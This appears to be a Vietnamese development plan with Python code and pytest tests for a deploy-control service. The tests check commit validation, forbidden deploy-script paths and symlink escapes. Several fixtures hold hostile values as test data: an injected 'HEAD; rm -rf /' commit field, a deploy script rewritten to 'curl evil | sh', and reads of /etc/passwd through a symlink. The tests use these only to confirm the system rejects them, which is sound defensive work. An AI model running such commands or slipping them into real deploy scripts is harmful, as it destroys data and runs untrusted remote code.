    r = goi(app, "POST", "/api/du-an/hr-codex/tu-dong/deploy", json_body=_than(), headers=DAI_CA)
    assert (r.status, r.json()["loi"]) == (422, "Dự án chỉ quét thử (bat_ghi: false)")
    (tmp_path / "b").mkdir()
    app2, pt2 = _app(tmp_path / "b", cd=CaiDatTuDong(lenh_deploy="d.sh", lenh_kiem_song="k.sh"))
    r = goi(app2, "POST", DP, json_body=_than(), headers=DAI_CA)
    assert (r.status, r.json()["loi"]) == (422, "Chưa khai đủ 3 lệnh") and _yeu_cau(pt) == _yeu_cau(pt2) == []
    assert goi(app2, "GET", "/api/du-an/repo-nhap/tu-dong").json()["san_sang"] is None


def test_khong_co_gi_cho_va_than_sai(tmp_path):
    app, _ = _app(tmp_path, san_sang=False)
    r = goi(app, "POST", DP, json_body=_than(), headers=DAI_CA)
    assert (r.status, r.json()["loi"]) == (422, "Không có bản mới nào chờ deploy")
    r = goi(app, "POST", DP, json_body={**_than(), "expected_commit": "HEAD; rm -rf /"}, headers=DAI_CA)
    assert r.status == 422 and r.json() == {"trang_thai": "khong_hop_le", "loi": ["Thân yêu cầu không hợp lệ"]}
    assert goi(app, "POST", "/api/du-an/khong-co/tu-dong/deploy", json_body=_than(), headers=DAI_CA).status == 404


def test_deploy_tay_khi_du_an_tam_dung(tmp_path):
    """Scenario "Deploy tay khi dự án tạm dừng" (D97 luật 3) — cả khi toàn trạm tạm dừng."""
    app, pt = _app(tmp_path)
    with closing(KhoSuKien(tmp_path / "sk.db")) as kho:
        ghi_tam_dung(kho.db, "repo-nhap", tam_dung=True, tac_nhan="dai-ca/dashboard")
        ghi_tam_dung(kho.db, "_tram", tam_dung=True, tac_nhan="dai-ca/dashboard")
    assert goi(app, "POST", DP, json_body=_than(), headers=DAI_CA).status == 200 and len(_yeu_cau(pt)) == 1


def test_dinh_that_doi_chua_co_su_kien_409(tmp_path, monkeypatch):
    app, pt = _app(tmp_path)
    monkeypatch.setattr("tram.api.tuyen_deploy.doc_dinh", lambda ten: "6" * 40)
    r = goi(app, "POST", DP, json_body=_than(), headers=DAI_CA)
    assert r.status == 409 and r.json()["loi"].startswith("Có bản mới hơn — tải lại")
    assert _yeu_cau(pt) == []
```

### File `tram/api/tuyen_deploy.py`

```python
"""D129: một tuyến Deploy dùng chung trang Tự động và Phê duyệt; kiểm bản mới nhất lúc nhận."""
from fastapi import APIRouter, Depends, Request
from pydantic import Field

from tram.api.bao_mat import yeu_cau_ghi
from tram.api.loi_envelope import TuyenEnvelopeKin
from tram.api.phu_thuoc import kiem_du_an_bead
from tram.api.than import ThanGhi
from tram.api.tuyen_tu_dong import _bat_ghi, _chay, can_kenh_that
from tram.cau_hinh.du_an import nap_du_an
from tram.chu import estop
from tram.deploy.git import dinh_hien_tai
from tram.giao_viec.git_kiem import kho_kiem
from tram.thao_tac.deploy import deploy_thao_tac

router = APIRouter(dependencies=[Depends(yeu_cau_ghi), Depends(can_kenh_that)], route_class=TuyenEnvelopeKin)


class ThanDeploy(ThanGhi):
    expected_commit: str = Field(pattern=r"^[0-9a-f]{40}$")


def doc_dinh(ten):
    return dinh_hien_tai(kho_kiem(ten), nap_du_an(ten).nhanh_chinh)


@router.post("/api/du-an/{ten}/tu-dong/deploy")
def r_deploy(ten: str, than: ThanDeploy, request: Request):
    pt = request.app.state.pt
    kiem_du_an_bead(pt, ten)
    return _chay(request, lambda k, kt: deploy_thao_tac(
        k, kt, ten, commit=than.expected_commit, ma=than.ma_thao_tac, bat_ghi=_bat_ghi(pt, ten),
        estop_bat=estop.dang_bat(), doc_dinh=lambda: doc_dinh(ten)))
```

### File `tram/api/app.py`

```diff
--- a/tram/api/app.py
+++ b/tram/api/app.py
@@ -5,6 +5,7 @@

 from tram.api import doi_ngu, ghep, luong, noi_bo, tho, tho_them, tuyen_chu, tuyen_doc, tuyen_ghi, tuyen_nho, usage
 from tram.api import cai_dat, tong_quan, tuyen_tu_dong, tuyen_yeu_cau, van_phong
+from tram.api import tuyen_deploy
 from tram.api.bao_mat import them_header_an_toan
 from tram.api.phu_thuoc import PhuThuocApi
 from tram.api.tuyen_giao import router as tuyen_giao
@@ -17,6 +18,7 @@
           LoiNhoKhach: 503}
 CAC_TUYEN = (tuyen_doc.router, tuyen_ghi.router, tuyen_chu.router, tuyen_nho.router, luong.router, tho.router,
              noi_bo.router, doi_ngu.router, usage.router, tho_them.router, ghep.router)
+CAC_TUYEN += (tuyen_deploy.router,)
 CAC_TUYEN += (tuyen_giao,)                     # 4a-2: GET /api/giao-viec
 CAC_TUYEN += (van_phong.router,)               # 2c: GET /api/van-phong
 CAC_TUYEN += (cai_dat.router,)                 # 2f: GET /api/cai-dat, /api/san-sang (chỉ Đại ca)
```

### File `tram/thao_tac/deploy.py`

```python
"""Nút Deploy của Đại ca (spec `tu-deploy` "Nút Deploy của Đại ca"; `dieu-khien-tu-dong` "Estop dừng cả tự merge và
tự deploy", "Deploy tay khi dự án tạm dừng"; D97 luật 3; Đại ca chốt 18/10: `bat_ghi: false` không Deploy tay).
Chỉ GHI YÊU CẦU (`deploy.yeu_cau`, nguồn `dai_ca`); chuỗi lệnh chạy ở pha `vong_deploy` (`tram.deploy.vong`), nơi
khoá chung được xét lại ngay trước chuỗi. Idempotent theo `ma_thao_tac` (bảng `thao_tac`). Từ chối TRƯỚC khi tạo
bản ghi `thao_tac`: khoá chung `deploy_tay` (estop, `bat_ghi`, thiếu lệnh → 422 kèm nhãn), đang deploy hay đã có
yêu cầu chờ → 422, không có gì chờ → 422, commit Đại ca đang xem khác commit mới nhất → 409 (màn hình cũ)."""
from tram.deploy.hien_thi import dang_deploy, san_sang
from tram.deploy.trang_thai import chua_ghi_nhan, doc_su_kien
from tram.duong_dan import bay_gio
from tram.su_kien.ghi_trong import ghi_trong_giao_dich
from tram.thao_tac.chay import KetQuaThaoTac, YeuCau, chay_thao_tac
from tram.thao_tac.chung import TAC_NHAN
from tram.thao_tac.loi import KhongHopLe, XungDot
from tram.tu_dong.khoa import NHAN_LY_DO, ly_do_chan
from tram.tu_dong.luu import doc_trang_thai, giao_dich

LOAI = "deploy.yeu_cau"


def deploy_thao_tac(kho, kho_tt, du_an: str, *, commit: str, ma: str, bat_ghi: bool,
                    estop_bat: bool, doc_dinh) -> KetQuaThaoTac:
    def kiem() -> None:
        ly = ly_do_chan(doc_trang_thai(kho.db, du_an), viec="deploy_tay", bat_ghi=bat_ghi, estop_bat=estop_bat)
        if ly:
            raise KhongHopLe(NHAN_LY_DO[ly[0]])
        ds = doc_su_kien(kho.db, du_an)
        if dang_deploy(ds) is not None:
            raise KhongHopLe("Đang có một lần deploy của dự án này — chờ xong rồi bấm lại")
        if (ss := san_sang(ds)) is None:
            raise KhongHopLe("Không có bản mới nào chờ deploy")
        if ss["commit"] != commit or chua_ghi_nhan(ds) or doc_dinh() != commit:
            raise XungDot(f"Có bản mới hơn — tải lại (bản chờ deploy của {du_an} đã đổi: hiện {ss['commit'][:12]},"
                          f" đang xem {commit[:12]})")

    def buoc(_) -> dict:
        with giao_dich(kho.db):
            if not any(s.loai == LOAI and s.du_lieu.get("ma_thao_tac") == ma for s in doc_su_kien(kho.db, du_an)):
                ghi_trong_giao_dich(kho.db, du_an, LOAI, {"ma_thao_tac": ma, "commit": commit, "nguon": "dai_ca"},
                                    tac_nhan=TAC_NHAN, luc=bay_gio())
        return {"commit": commit}

    yc = YeuCau(ma, LOAI, du_an, None, {"commit": commit}, commit)
    return chay_thao_tac(kho_tt, yc, kiem_moi=kiem, cac_buoc=[(LOAI, buoc)])
```

- [ ] Áp mã, chạy xanh; lưu số đo thật, không dùng số dự kiến.

```bash
tests/chan_host/chay.sh -q tests/test_api_deploy.py
```

- [ ] Kiểm diff và trần dòng; giữ thay đổi chưa commit.

## Task 8: Tập cấm bắt buộc ở mọi cửa; C2/Q1, V2-C2/V2-Q1

**Hợp đồng vòng 3:** `loai_trong_cay` uỷ quyền cho `tram.giao_viec.tu_merge_rao.loai_trong_repo`
của TM-2; không chép thêm bộ nhận diện. TM-2 phải được áp trước Task 8. Cây commit quyết định
symlink/hoa-thường, không dùng filesystem checkout để đoán đích. Symlink ở bất kỳ đoạn nào
(kể cả trước `..`) → lỗi đóng; phía thợ chuyển lỗi cố định vào bàn giao và không gọi runner.
GET 500/mất kết nối/sai dạng/thiếu trường/lệnh không hợp lệ cũng cùng đường lỗi; chỉ cấu hình
hợp lệ thật sự không có lệnh mới trả `()`. GET dùng hạn 10s sẵn có của `KhachTram`, không thêm retry.
`kiem_sau_xong(..., loi_cam=...)` vẫn ghi đè commit/lượt/kết quả lệnh và gửi `bao.xong` như hợp đồng cũ;
trạm quyết bước tiếp, không mất bàn giao vì ngoại lệ không được xử lý.

**Files:** `tests/tho_chay_gia.py`, `tests/test_deploy_cam.py`, `tests/test_deploy_review_v2.py`, `tram/deploy/cam.py`, `tram/kiem/duong_dan_cam.py`, `tram/kiem/diff.py`, `tram/kiem/lenh_tho.py`, `tram/giao_viec/kiem_lai.py`, `tram/giao_viec/xet_spec.py`, `tram/giao_viec/xet_xong.py`, `tram/giao_viec/tick_pipeline.py`, `tram/giao_viec/xu_ly_viec.py`, `tram/tho/ket_thuc.py`

**Bằng chứng phiên này:** Đỏ thực trước sửa: 5 failed, 2 passed; code/spec/kiểm lại bị ngoại lệ miễn; phía thợ chưa chặn nên rơi vào runner. Sau sửa các ca này xanh trong nhóm 60. Test callback kiểm gốc symlink, tuyệt đối, thư mục và ngoài repo.

- [ ] Áp test, chạy đỏ trước mã.

### File `tests/test_deploy_cam.py`

```python
"""TM-3 (D89; tu-deploy "File mà ba lệnh dùng là file cấm sửa"; Codex C2, Q1): file/thư mục trong repo mà ba lệnh
nhắc tới — kể cả gọi bằng đường tuyệt đối — là tập cấm BẮT BUỘC ở MỌI cửa kiểm: xét `bao.xong` (code, spec), kiểm
lại của trạm, kiểm sau xong phía thợ. Ngoại lệ dự án (`duong_dan_cam_cho_phep`) KHÔNG miễn được tập này. Scenario
"Agent sửa script deploy": không chạy lệnh kiểm, escalation `dong-file-cau-hinh`, việc chờ Đại ca."""
import os
import threading
from contextlib import closing
from dataclasses import replace
from pathlib import Path

import pytest

import tram.deploy.cam as cam_module
from bd_gia import BdGia
from bead_gia import bead
from giao_viec_gia import bug, dung
from git_gia import git
from kho_kiem_gia import dung_kho
from kho_phieu_gia import LUC, dat_phieu, kho_tam
from su_kien_gia import cong_bo, ds
from test_tick import GIU, chuan_bi_code_xong, loai
from test_tho_theo_doi_ket_thuc import bao, chuan_bi_phieu, su_kien
from test_xet_spec import DA, TC, bg_spec, tep_spec
from test_xet_xong import F
from tho_chay_gia import FILE_BG, khoi_bg
from tram.cau_hinh.du_an import DuAn
from tram.cau_hinh.du_an_giao import CauHinhGiao
from tram.deploy.cam import cam_cua, cam_tu_lenh, cam_tu_lenh_tho, loai_trong_cay
from tram.duong_dan import tram_home
from tram.giao_viec.git_kiem import fetch
from tram.giao_viec.su_kien import moi_nhat
from tram.giao_viec.tick import mot_vong_tick
from tram.giao_viec.xu_ly_viec import xu_ly_cong_viec
from tram.phieu.kho import KhoPhieu
from tram.tho.ket_thuc import ket_thuc_xong
from tram.tho.theo_doi import TheoDoi
from tram.tu_dong.cai_dat import MAC_DINH
from tram.tu_dong.luu import doi_cai_dat
from xu_ly_gia import ket_thuc_bang

TC_CODE = "Tên kết thúc 'ỷ' không mất byte"


def dat_lenh(db, du_an: str, **lenh) -> None:
    doi_cai_dat(db, du_an, lambda c: replace(c, **lenh), tac_nhan="dai-ca/dashboard")


def mien(da: DuAn, *cho_phep: str) -> DuAn:
    """Ngoại lệ dự án (`duong_dan_cam_cho_phep` trong `du-an/<ten>.yaml`) cố tình miễn đúng file của lệnh."""
    return replace(da, giao=replace(da.giao, duong_dan_cam_cho_phep=cho_phep))


def test_cam_tu_lenh_co_o_commit_hoac_nhanh_chinh_ke_ca_duong_tuyet_doi(tmp_path, monkeypatch):
    """Codex Q1: `/…/repo/src/tom_tat.py` (kho kiểm, bản sạch deploy, hay `duong_dan` của dự án) bảo vệ như đường
    tương đối; file tạo mới ở commit hay xoá khỏi commit (còn ở nhánh chính) đều bị bắt."""
    k = dung_kho(tmp_path)
    sha = k.day("tram/hr-1", {"scripts/deploy.sh": "echo\n", "kiem.sh": None}, tu=k.main)    # tạo mới + xoá
    fetch(k.kho)
    kho, da = KhoPhieu(tmp_path / "su-kien.db"), DuAn("hr-codex", tmp_path / "repo-that", None, {})
    assert cam_tu_lenh(kho.db, k.kho, da, sha) == ()
    sach = tram_home() / "kho-deploy" / "hr-codex"
    dat_lenh(kho.db, "hr-codex", lenh_deploy="sh scripts/deploy.sh", lenh_kiem_song=f"./kiem.sh --thu-muc={sach}/src",
             lenh_lui=f"/Users/Shared/tram-deploy/lui.sh ../ngoai {k.kho}/AGENTS.md {da.duong_dan}/docs/handovers")
    assert cam_tu_lenh(kho.db, k.kho, da, sha) == ("AGENTS.md", "docs/handovers/**", "kiem.sh", "scripts/deploy.sh",
                                                   "src/**")
    monkeypatch.setattr(cam_module.subprocess, "run", lambda *a, **kw: (_ for _ in ()).throw(AssertionError("gọi git")))
    assert cam_cua(MAC_DINH, (k.kho,), k.kho, sha) == ()                         # chưa khai lệnh: không gọi git
    kho.close()


def test_callback_chan_thoat_goc_qua_dau_cham_hay_symlink(tmp_path):
    """Hợp đồng D89 mới: callback dựng từ gốc repo đáng tin — chuẩn hoá `..`, chặn thoát gốc, symlink trong cây không được dùng để thoát gốc; gốc đi qua symlink trên đĩa vẫn nhận ra."""
    k = dung_kho(tmp_path)
    os.symlink("/etc", k.dev / "lien")
    git(k.dev, "add", "lien")
    git(k.dev, "commit", "-qm", "lien")
    git(k.dev, "push", "-q", "origin", "HEAD:refs/heads/main")
    fetch(k.kho)
    (tmp_path / "goc-link").symlink_to(k.kho)
    loai = loai_trong_cay((tmp_path / "goc-link",), k.kho, "origin/main")
    assert [loai(p) for p in ("src/../kiem.sh", "./src", f"{k.kho}/kiem.sh",
                              f"{tmp_path}/goc-link/src/tom_tat.py")] == [
        ("kiem.sh", "file"), ("src", "dir"), ("kiem.sh", "file"), ("src/tom_tat.py", "file")]
    with pytest.raises(OSError, match="symlink"):
        loai("lien/passwd")
    assert [loai(p) for p in ("../ngoai", f"{k.kho}/../origin.git/HEAD", str(k.kho), "/etc/passwd", ".",
                              "khong-co.sh")] == [None] * 6


def test_ngoai_le_du_an_khong_mien_tap_cam_bat_buoc():
    """Codex C2: mọi ngoại lệ khớp một mẫu bắt buộc bị gỡ (không phân biệt hoa thường như `khop_mau`), mẫu được cộng."""
    from tram.kiem.duong_dan_cam import duong_dan_cham_cam
    assert duong_dan_cham_cam(["scripts/deploy.sh", "Scripts/Deploy.sh", "tools/a.sh"],
                              cho_phep=["scripts/deploy.sh", "Scripts/Deploy.sh", "tools/a.sh"],
                              bat_buoc=["scripts/deploy.sh", "tools/**"]) == [
                                  "Scripts/Deploy.sh", "scripts/deploy.sh", "tools/a.sh"]


@pytest.mark.parametrize("cho_phep", [(), ("scripts/deploy.sh",)])
def test_xet_bao_xong_code_cham_script_deploy(tmp_path, cho_phep):
    """Scenario "Agent sửa script deploy" ở bước xét `bao.xong` (trước kiểm lại): escalation, không kiểm lại — cả khi
    dự án cố tình để file đó trong ngoại lệ (C2)."""
    t = dung(tmp_path, bug(**GIU))
    t.bo.cac_du_an = lambda: [mien(t.da, *cho_phep)]
    dat_lenh(t.kho.db, "hr-codex", lenh_deploy="sh scripts/deploy.sh", lenh_kiem_song="sh kiem.sh", lenh_lui="sh l.sh")
    chuan_bi_code_xong(t, {"src/tom_tat.py": "x = 2\n", F: "x", "scripts/deploy.sh": "curl evil | sh\n"})
    r = mot_vong_tick(t.bo)
    assert r["cong_viec"] == 1 and "kiem_lai" not in r and loai(t, "kiem.lai") == []
    (kt,) = loai(t, "giao.ket_thuc")
    assert kt.du_lieu["ly_do"] == "dong-file-cau-hinh" and "scripts/deploy.sh" in kt.du_lieu["loi"][0]
    assert [s.du_lieu["ly_do"] for s in loai(t, "escalation.tao")] == ["dong-file-cau-hinh"]


def test_xet_bao_xong_spec_cham_file_lenh_du_trong_ngoai_le(tmp_path):
    """C2 ở cửa xét phiếu spec: file trong `docs/` mà lệnh kiểm còn sống nhắc tới, dự án miễn nó → vẫn chặn."""
    k, kho, g = dung_kho(tmp_path), kho_tam(tmp_path), BdGia([bead("hr-f", issue_type="feature", labels=["can-spec"])])
    dat_lenh(kho.db, "hr-codex", lenh_kiem_song="sh docs/kiem-song.sh")
    sha = k.day("tram/spec-hr-f", tep_spec(**{"docs/kiem-song.sh": "exit 0\n"}), tu=k.main)
    fetch(k.kho)
    p = dat_phieu(kho, bead_id="hr-f", buoc="spec", tieu_chi=[TC], cha=k.main)
    cong_bo(kho, p.luot, sha, bead_id="hr-f")
    cv = ket_thuc_bang(kho, p, "xong", commit=sha, ban_giao=bg_spec(sha))
    assert xu_ly_cong_viec(kho, cv, du_an=mien(DA, "docs/kiem-song.sh"), bd=g, kho_git=k.kho, luc=LUC)
    kt = moi_nhat(ds(kho, "hr-f"), "giao.ket_thuc").du_lieu
    assert kt["ly_do"] == "dong-file-cau-hinh" and "docs/kiem-song.sh" in kt["loi"][0]


@pytest.mark.parametrize("cho_phep", [(), ("kiem.sh",)])
def test_kiem_lai_cham_file_lenh_kiem_song(tmp_path, cho_phep):
    """Đại ca khai lệnh SAU khi `bao.xong` đã qua: kiểm lại của trạm vẫn bắt (tập cấm tính lại mỗi lần), cả khi dự
    án để `kiem.sh` trong ngoại lệ (C2)."""
    t = dung(tmp_path, bug(**GIU), boc=None)
    t.bo.cac_du_an = lambda: [mien(t.da, *cho_phep)]
    chuan_bi_code_xong(t, {"src/tom_tat.py": "x = 2\n", F: "x", "kiem.sh": "exit 0 # sửa\n"})
    assert mot_vong_tick(t.bo)["cho_boc"] == 1                                    # xét qua, chưa có principal kiểm
    dat_lenh(t.kho.db, "hr-codex", lenh_kiem_song="sh kiem.sh")
    t.bo.boc = lambda a: a
    r = mot_vong_tick(t.bo)
    assert r["kiem_lai"] == 1
    kl = loai(t, "kiem.lai")[-1].du_lieu
    assert (kl["dat"], kl["cham_cam"], kl["ket_qua"]) == (False, ["kiem.sh"], [])  # không chạy lệnh kiểm nào
    assert [s.du_lieu["ly_do"] for s in loai(t, "escalation.tao")] == ["dong-file-cau-hinh"]


@pytest.mark.parametrize("cho_phep", ["", "duong_dan_cam_cho_phep: [kiem_ok.py]\n"])
def test_tho_bao_som_khi_sua_file_lenh(tmp_path, monkeypatch, cho_phep):
    """Phía thợ đọc lệnh qua GET công khai của tram-api; sửa `kiem_ok.py` mà lệnh kiểm còn sống nhắc tới (đường
    tuyệt đối vào worktree của thợ) → lỗi bàn giao, cả khi yaml dự án miễn file đó (C2)."""
    m, pc = chuan_bi_phieu(tmp_path, monkeypatch)
    yaml = Path(os.environ["TRAM_REPO"]) / "du-an" / "hr-codex.yaml"
    yaml.write_text(yaml.read_text() + cho_phep)
    m.t.app.state.pt = replace(m.t.pt, cac_du_an=lambda: ["hr-codex"])          # trạm giả biết dự án của phiếu
    with closing(m.t.kho()) as kho:
        dat_lenh(kho.db, "hr-codex", lenh_kiem_song=f"python3 {pc.wt}/kiem_ok.py")
    (pc.wt / "kiem_ok.py").write_text("print('da sua')\n")
    (pc.wt / FILE_BG).parent.mkdir(parents=True)
    (pc.wt / FILE_BG).write_text(khoi_bg(TC_CODE))
    bao(pc, "--xong", "--ban-giao", FILE_BG, "xong")
    td = TheoDoi(pc, m.nc, threading.Event())
    td.mot_luot()
    ket_thuc_xong(pc, m.nc, td.xong)
    assert "Diff chạm đường dẫn cấm: kiem_ok.py" in su_kien(m, "bao.xong")[0]["loi_ban_giao"]


def test_tho_khong_doc_duoc_tram_thi_dung_kiem(tmp_path):
    class Hong:
        def goi(self, *a, **kw):
            raise RuntimeError("không gọi được tram-api")
    k = dung_kho(tmp_path)
    with pytest.raises(OSError, match="Không xác minh được file lệnh tự động"):
        cam_tu_lenh_tho(Hong(), "hr-codex", k.kho, "main")
```

### File `tests/tho_chay_gia.py`

Fixture máy thợ phải đăng ký dự án với API đọc: trước đây GET trả 404 và bị nuốt lỗi.
Giữ test runner thật, không giả thành công D89 hay bỏ assertion bàn giao.

```diff
--- a/tests/tho_chay_gia.py
+++ b/tests/tho_chay_gia.py
@@ -77,6 +77,7 @@ def dung_may(tmp_path, monkeypatch, kich_ban, *, so_lan=3, phut=90, buoc="code")
         f"moi_truong_kiem: {{file: {tmp_path / 'env.testing'}, dich: .env.testing}}\n")
     monkeypatch.setenv("TRAM_REPO", str(repo))
     t = tao_tram(tmp_path)
+    t.pt.cac_du_an = lambda: ["hr-codex"]  # D89: GET cấu hình dự án thật trong trạm ASGI giả
     da_cap = []

     def chon(khe_id, hm):                      # đứng thay phần 4: đúng MỘT phiếu cho bead hr-1
```

### File `tests/test_deploy_review_v2.py`

```python
"""Phản ví dụ review vòng 2: biên HTTP/runner giả, Git và bàn giao thật; không gọi mạng/OS runner."""
from dataclasses import replace
from types import SimpleNamespace

import pytest

from git_gia import ghi, git
from test_lenh_tho import wt, phieu, ban_giao
from tram.tho.ket_thuc import ket_thuc_xong
from tram.tu_dong.cai_dat import MAC_DINH, sang_api

LOI_CAM = "Không xác minh được file lệnh tự động — không chạy kiểm; chờ trạm kiểm lại"


def ket_thuc(wt, tmp_path, monkeypatch, khach):
    import tram.tho.ket_thuc as kt
    from tram.cau_hinh.du_an_giao import CauHinhGiao
    p, bg = phieu(), ban_giao()
    pc = SimpleNamespace(p=p, wt=wt, principal=SimpleNamespace(boc=lambda a: a, kill_nhom=lambda *a: None))
    ch = SimpleNamespace(path_cli="/usr/bin:/bin", thoi_gian_cho_kiem_giay=1, han_chot_dung_mem_phut=1)
    nc = SimpleNamespace(khach=khach, goc=tmp_path, ch=SimpleNamespace(chay=ch))
    giao = CauHinhGiao(duong_dan_cam_cho_phep=("scripts/deploy.sh", "kiem.py", "link"))
    monkeypatch.setattr(kt, "nap_du_an", lambda _: SimpleNamespace(giao=giao))
    monkeypatch.setattr(kt, "luu_wip", lambda *a: None)
    monkeypatch.setattr(kt, "_day", lambda *a: "cong_bo")
    baocao = []
    monkeypatch.setattr(kt, "bao", lambda pc, nc, than, *a: baocao.append(than))
    def cam_runner(*a, **kw):
        pytest.fail("runner đã được gọi trước khi xác minh D89")
    monkeypatch.setattr("tram.kiem.lenh_tho.chay_mot_lenh", cam_runner)
    assert ket_thuc_xong(pc, nc, {"ban_giao": bg.model_dump(), "request_id": "v2"}) == "cong_bo"
    assert len(baocao) == 1 and baocao[0]["loai"] == "xong"
    assert baocao[0]["ban_giao"]["lenh_kiem"] == []
    assert baocao[0]["commit"] == git(wt, "rev-parse", "HEAD")
    return baocao[0]


class Khach:
    def __init__(self, ma=200, data=None, loi=None):
        self.ma, self.data, self.loi = ma, data, loi

    def goi(self, *a, **kw):
        assert kw == {"xac_thuc": False}
        if self.loi:
            raise self.loi
        return self.ma, self.data


@pytest.mark.parametrize("khach", [
    Khach(500, {"response": "noi-dung-khong-duoc-lo"}),
    Khach(loi=RuntimeError("noi-dung-khong-duoc-lo")),
    Khach(data={"cai_dat": {"lenh": {"deploy": "sh scripts/deploy.sh"}}}),
    Khach(data={"cai_dat": {**sang_api(MAC_DINH), "tu_deploy": "false"}}),
    Khach(data={"cai_dat": sang_api(replace(MAC_DINH, lenh_deploy="sh '"))}),
])
def test_v2_c2_loi_doc_cau_hinh_dung_truoc_runner(wt, tmp_path, monkeypatch, khach):
    ghi(wt, {"scripts/deploy.sh": "exit 0\n"}, "sửa script được miễn")
    kq = ket_thuc(wt, tmp_path, monkeypatch, khach)
    assert LOI_CAM in kq["loi_ban_giao"]
    assert "noi-dung-khong-duoc-lo" not in str(kq)


def test_v2_c2_chi_cau_hinh_hop_le_rong_tra_tap_rong(wt):
    from tram.deploy.cam import cam_tu_lenh_tho
    assert cam_tu_lenh_tho(Khach(data={"cai_dat": sang_api(MAC_DINH)}), "hr", wt, "main") == ()


@pytest.mark.parametrize("doi", ["link", "dich", "link_cham_cham", "hoa_thuong"])
def test_v2_q1_duong_lenh_khong_duoc_lot_runner(wt, tmp_path, monkeypatch, doi):
    (wt / "scripts").mkdir()
    (wt / "scripts/deploy.sh").write_text("exit 0\n")
    (wt / "link").symlink_to("scripts", target_is_directory=True)
    git(wt, "add", ".")
    git(wt, "commit", "-qm", "cây gốc có link nội bộ")
    git(wt, "update-ref", "refs/remotes/origin/main", "HEAD")
    if doi == "link":
        (wt / "link").unlink()
        (wt / "link").symlink_to("./scripts", target_is_directory=True)
        git(wt, "add", ".")
        git(wt, "commit", "-qm", "đổi link, giữ đích")
    else:
        ghi(wt, {"scripts/deploy.sh": "exit 1\n"}, "đổi đích, giữ link")
    token = {"link_cham_cham": "link/../scripts/deploy.sh", "hoa_thuong": "Scripts/Deploy.SH"}.get(
        doi, "link/deploy.sh")
    cd = sang_api(replace(MAC_DINH, lenh_deploy=f"sh {token}"))
    kq = ket_thuc(wt, tmp_path, monkeypatch, Khach(data={"cai_dat": cd}))
    if doi == "hoa_thuong":
        assert "Diff chạm đường dẫn cấm: scripts/deploy.sh" in kq["loi_ban_giao"]
    else:
        assert LOI_CAM in kq["loi_ban_giao"]


@pytest.mark.parametrize("token", ["link/deploy.sh", "link/../scripts/deploy.sh"])
def test_v2_q1_doc_symlink_trong_commit_khong_theo_checkout(wt, tmp_path, token):
    from tram.deploy.cam import loai_trong_cay
    (wt / "link").symlink_to("scripts", target_is_directory=True)
    ghi(wt, {"scripts/deploy.sh": "exit 0\n"})
    bare = tmp_path / "kiem.git"
    git(tmp_path, "clone", "-q", "--bare", str(wt), str(bare))
    with pytest.raises(OSError, match="symlink"):
        loai_trong_cay((wt, bare), bare, "HEAD")(token)
```

### File `tram/deploy/cam.py`

```python
"""D89 nối vào kiểm đường cấm (spec `tu-deploy` "File mà ba lệnh dùng là file cấm sửa"; design D-4): file/thư mục
trong repo dự án mà ba lệnh nhắc tới (`tram.tu_dong.file_cam.duong_dan_tu_lenh`, hợp đồng TM-1) được chuyển riêng qua
`bat_buoc=` của kiểm đường cấm — agent sửa → `dong-file-cau-hinh`, không bao giờ tự merge.

"Có trong repo" = có ở commit đang xét HOẶC ở nhánh chính: agent tạo script mà lệnh deploy sẽ chạy, hay xoá script
đang có, đều bị bắt. Phía trạm đọc cài đặt từ kho sự kiện; phía thợ (`tram/tho/ket_thuc.py`, máy thợ không mở kho
sự kiện) đọc qua GET công khai của tram-api. Không đọc/xác minh được → dừng trước runner, ghi lỗi bàn giao."""
import subprocess
from collections.abc import Callable
from pathlib import Path

from tram.duong_dan import tram_home
from tram.giao_viec.tu_merge_rao import loai_trong_repo
from tram.tu_dong.cai_dat import MAC_DINH, TRUONG_LENH, CaiDatTuDong, loi_cai_dat, sang_api, tu_api
from tram.tu_dong.file_cam import duong_dan_tu_lenh
from tram.tu_dong.luu import doc_cai_dat

def loai_trong_cay(goc_tin: tuple[Path, ...], repo: Path, *refs: str) -> Callable[[str], tuple[str, str] | None]:
    """Dùng đúng bộ nhận diện TM-2: cây commit, không theo symlink, so không phân biệt hoa/thường."""
    return loai_trong_repo(repo, goc_tin, refs)


def cam_cua(cd: CaiDatTuDong, gocs: tuple[Path, ...], repo: Path, *refs: str) -> tuple[str, ...]:
    """Chưa khai lệnh nào → () và không gọi git."""
    return duong_dan_tu_lenh(cd, loai_trong_cay(gocs, repo, *refs)) if any(getattr(cd, t) for t in TRUONG_LENH) else ()


def cam_tu_lenh(db, repo: Path, da, commit: str) -> tuple[str, ...]:
    gocs = (repo, da.duong_dan, tram_home() / "kho-deploy" / da.ten)
    return cam_cua(doc_cai_dat(db, da.ten)[0], gocs, repo, commit, f"origin/{da.nhanh_chinh}")


LOI_CAM = "Không xác minh được file lệnh tự động — không chạy kiểm; chờ trạm kiểm lại"


def _dung_dang(d, mau) -> bool:
    if isinstance(mau, dict):
        return isinstance(d, dict) and d.keys() == mau.keys() and all(_dung_dang(d[k], v) for k, v in mau.items())
    return type(d) is type(mau)


def cam_tu_lenh_tho(khach, du_an: str, wt: Path, nhanh_chinh: str) -> tuple[str, ...]:
    """GET đọc, hạn 10s của KhachTram; lỗi cố định để thợ vẫn bàn giao, không chạy kiểm."""
    try:
        ma, kq = khach.goi("GET", f"/api/du-an/{du_an}/tu-dong", xac_thuc=False)
        if ma != 200 or not _dung_dang(kq["cai_dat"], sang_api(MAC_DINH)):
            raise ValueError
        cd = tu_api(kq["cai_dat"])
        if loi_cai_dat(cd, bat_ghi=True):
            raise ValueError
        return cam_cua(cd, (wt,), wt, "HEAD", f"origin/{nhanh_chinh}")
    except (RuntimeError, KeyError, TypeError, AttributeError, ValueError, OSError, subprocess.SubprocessError):
        raise OSError(LOI_CAM) from None
```

### File `tram/kiem/duong_dan_cam.py`

```diff
--- a/tram/kiem/duong_dan_cam.py
+++ b/tram/kiem/duong_dan_cam.py
@@ -28,10 +28,11 @@


 def duong_dan_cham_cam(cac_duong_dan: Iterable[str], *, them: Iterable[str] = (),
-                       cho_phep: Iterable[str] = ()) -> list[str]:
+                       cho_phep: Iterable[str] = (), bat_buoc: Iterable[str] = ()) -> list[str]:
     """Các đường dẫn (tương đối POSIX từ gốc repo) chạm danh sách cấm, đã sắp xếp.
     `them`: mẫu dự án thêm (`duong_dan_cam`). `cho_phep`: ngoại lệ — CHỈ từng đường dẫn cụ thể; mục có ký tự glob
     bị bỏ qua (không dùng glob gỡ cả nhóm)."""
     mau = (*DUONG_DAN_CAM_TRAM, *them)
     mien = {p.strip("/") for p in cho_phep if not (set(p) & KY_TU_GLOB)}
